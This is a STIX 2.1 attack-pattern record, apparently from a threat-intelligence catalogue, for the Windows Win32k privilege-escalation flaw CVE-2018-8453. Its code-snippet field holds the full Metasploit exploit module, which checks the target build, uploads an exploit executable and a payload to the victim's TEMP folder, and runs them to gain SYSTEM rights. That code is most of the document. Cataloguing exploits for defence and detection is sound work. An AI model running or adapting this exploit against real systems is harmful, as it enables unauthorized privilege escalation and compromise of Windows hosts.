{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--9bdd1d94-81d7-4b83-a92e-a3437bfe9cc1",
    "created": "2024-08-14T16:49:58.935442Z",
    "modified": "2024-08-14T16:49:58.935446Z",
    "name": "Windows NtUserSetWindowFNID Win32k User Callback",
    "description": " An elevation of privilege vulnerability exists in Windows when the Win32k component fails to properly handle objects in memory, aka \"Win32k Elevation of Privilege Vulnerability.\" This affects Windows 7, Windows Server 2012 R2, Windows RT 8.1, Windows Server 2008, Windows Server 2019, Windows Server 2012, Windows 8.1, Windows Server 2016, Windows Server 2008 R2 Windows 10, Windows 10 Servers. This module is tested against Windows 10 v1703 x86.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/local/cve_2018_8453_win32k_priv_esc.rb",
            "external_id": "cve_2018_8453_win32k_priv_esc.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2018-8453"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/ze0r/cve-2018-8453-exp"
        },
        {
            "source_name": "reference",
            "url": "https://mp.weixin.qq.com/s/ogKCo-Jp8vc7otXyu6fTig"
        },
        {
            "source_name": "reference",
            "url": "https://mp.weixin.qq.com/s/dcbUeegM0BqErtDufOXfoQ"
        },
        {
            "source_name": "reference",
            "url": "https://securelist.com/cve-2018-8453-used-in-targeted-attacks/88151/"
        },
        {
            "source_name": "reference",
            "url": "https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2018-8453"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Local\n  Rank = ManualRanking\n\n  include Msf::Post::File\n  include Msf::Exploit::EXE\n  include Msf::Post::Windows::Priv\n  include Msf::Exploit::FileDropper\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Windows NtUserSetWindowFNID Win32k User Callback',\n        'Description' => %q{\n          An elevation of privilege vulnerability exists in Windows when the Win32k component\n          fails to properly handle objects in memory, aka \"Win32k Elevation of Privilege Vulnerability.\"\n          This affects Windows 7, Windows Server 2012 R2, Windows RT 8.1, Windows Server 2008, Windows\n          Server 2019, Windows Server 2012, Windows 8.1, Windows Server 2016, Windows Server 2008 R2,\n          Windows 10, Windows 10 Servers.\n          This module is tested against Windows 10 v1703 x86.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'ze0r', # Exploit analysis and PoC\n          'Kaspersky Lab',  # Vulnerability discovery/detection\n          'Jacob Robles'    # Metasploit module\n        ],\n        'Platform' => 'win',\n        'Arch' => ARCH_X86,\n        'SessionTypes' => [ 'meterpreter' ],\n        'DefaultOptions' => {\n          'EXITFUNC' => 'thread'\n        },\n        'Targets' => [\n          [\n            'Windows 10 v1703 (Build 15063) x86', {\n              'UniqueProcessIdOffset' => 180,\n              'TokenOffset' => 252,\n              'Version' => Msf::WindowsVersion::Win10_1703\n            }\n          ]\n        ],\n        'References' => [\n          ['CVE', '2018-8453'],\n          ['URL', 'https://github.com/ze0r/cve-2018-8453-exp'],\n          ['URL', 'https://mp.weixin.qq.com/s/ogKCo-Jp8vc7otXyu6fTig'],\n          ['URL', 'https://mp.weixin.qq.com/s/dcbUeegM0BqErtDufOXfoQ'],\n          ['URL', 'https://securelist.com/cve-2018-8453-used-in-targeted-attacks/88151/'],\n          ['URL', 'https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2018-8453']\n        ],\n        'Notes' => {\n          'SideEffects' => [ARTIFACTS_ON_DISK, SCREEN_EFFECTS],\n          'Stability' => [CRASH_OS_RESTARTS]\n        },\n        'DisclosureDate' => '2018-10-09',\n        'DefaultTarget' => 0,\n        'Compat' => {\n          'Meterpreter' => {\n            'Commands' => %w[\n              stdapi_sys_config_getenv\n              stdapi_sys_process_execute\n            ]\n          }\n        }\n      )\n    )\n  end\n\n  def target_info\n    fail_with(Failure::None, 'Session is already elevated') if is_system?\n\n    version = get_version_info\n    unless version.build_number == target['Version'] && sysinfo['Architecture'] == 'x86'\n      fail_with(Failure::NoTarget, 'Target is not compatible with exploit')\n    end\n  end\n\n  def write_file_to_target(fname, data)\n    tempdir = session.sys.config.getenv('TEMP')\n    file_loc = \"#{tempdir}\\\\#{fname}\"\n    vprint_warning(\"Attempting to write #{fname} to #{tempdir}\")\n    write_file(file_loc, data)\n    vprint_good(\"#{fname} written\")\n    file_loc\n  rescue Rex::Post::Meterpreter::RequestError => e\n    elog('Unable to write file to target', error: e)\n    fail_with(Failure::Unknown, \"Writing #{fname} to disk was unsuccessful\")\n  end\n\n  def exploit\n    target_info\n    exe_name = 'CVE-2018-8453.exe'\n    exe_path = File.join(Msf::Config.data_directory, 'exploits', 'CVE-2018-8453', exe_name)\n    vprint_status(\"Reading payload from file #{exe_path}\")\n    raw = File.read(exe_path)\n\n    tmp_exe = \"#{Rex::Text.rand_text_alphanumeric(10)}.exe\"\n    vprint_status(\"Uploading exploit exe as: #{tmp_exe}\")\n    exe_rpath = write_file_to_target(tmp_exe, raw)\n    register_file_for_cleanup(exe_rpath)\n\n    tmp_payload = \"#{Rex::Text.rand_text_alpha(6..14)}.exe\"\n    payload_rpath = write_file_to_target(tmp_payload, generate_payload_exe)\n    vprint_status(\"Uploading payload #{tmp_payload}\")\n    register_file_for_cleanup(payload_rpath)\n\n    command = \"\\\"#{exe_rpath}\\\" \\\"#{payload_rpath}\\\" #{target['UniqueProcessIdOffset']} #{target['TokenOffset']}\"\n\n    vprint_status(\"Executing command: #{command}\")\n    session.sys.process.execute(command, nil, { 'Hidden' => false })\n    print_good('Exploit finished, wait for privileged payload execution to complete.')\n  end\nend\n",
    "x_mitre_disclosure_date": "2018-10-09",
    "x_mitre_platforms": [
        "win'"
    ]
}